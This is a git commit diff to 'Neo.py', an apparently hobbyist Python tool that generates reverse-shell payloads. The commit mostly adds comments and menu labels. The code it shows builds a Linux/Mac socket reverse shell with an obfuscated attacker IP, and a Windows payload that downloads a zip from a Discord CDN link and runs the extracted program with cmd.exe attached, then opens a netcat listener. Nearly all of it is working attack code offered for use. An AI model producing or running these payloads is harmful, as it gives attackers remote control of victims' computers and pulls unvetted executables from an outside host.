531f3c603781ef41506b2ae227af0066a16c4c21
Psyquoquack <90555014+Psyquoquack@users.noreply.github.com>
2021-10-30 17:13:38 +0200

    And comment and fix bug (color not visible)

--- Neo.py
+++ Neo.py
@@ -1,3 +1,5 @@
+# v0.1.1
+# Install an import libs
 from os import system
 system("sudo pip3 install art")
 system("sudo pip3 install termcolor")
@@ -6,37 +8,44 @@ from art import *
 from termcolor import colored
 
 def frame():
+    # graphics
     system("clear||cls")
     print(colored(text2art("Neo".center(30)),'cyan'))
     print(colored("Created by Psyquoquack-pack\n\n".center(60),'red'))
-    print("[1]- Python payload\n[2]- Python payload for windows\n[3]- Install requirements\n\n")
+    # Diffrents Choice
+    print("[1]- Python reverse shell\n[2]- Python reverse shell for windows\n[3]- Install requirements\n\n")
     choice1 = input("[1-99]:")
+    # payload linux and mac
     if choice1 == "1":
         import base64
         print(colored(text2art("PAYLOAD".center(30)),'red'))
         cpl = input("Attacker Ip:")
         port = input("Attacker Open Port [R: 87]:")
         encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
+        # write and close file
         fichier = open("payload.py", "w")
         towrite = "import socket,subprocess,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((base64.b32decode(bytearray('"+encodedBytes+"', 'ascii')).decode('utf-8'),"+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
         fichier.write(str(towrite))
         fichier.close()
         print(colored("Payload generated !".center(60),'red'))
         toexe = "sudo netcat -lnvp "+port+""
-        system(toexe)
+        system(toexe) # lisen port
+    # payload for windows
     if choice1 == "2":
         import base64
         print(colored(text2art("PAYLOAD".center(30)),'red'))
         cpl = input("Attacker Ip:")
         port = input("Attacker Open Port [R: 87]:")
         encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
+        # write and close file
         fichier = open("winpayload.py", "w")
         towrite = "import base64,os;os.system('@echo off');os.system('powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/769931868488597514/889144849461313616/sc.zip -O sc.zip');os.system('tar -xf sc.zip');code_cry = '"+encodedBytes+"';ash = 'ascii';utf ='utf-8';os.system('sc.exe '+base64.b32decode(bytearray(code_cry, ash)).decode(utf)+' "+port+" -e cmd.exe');"
         fichier.write(str(towrite))
         fichier.close()
         print(colored("Payload generated !".center(60),'red'))
         toexe = "sudo netcat -lnvp "+port+""
-        system(toexe)
+        system(toexe) # lisen port
+    # install libs
     if choice1 == "3":
         system("sudo apt-get install nmap")
         system("sudo apt-get install netcat")
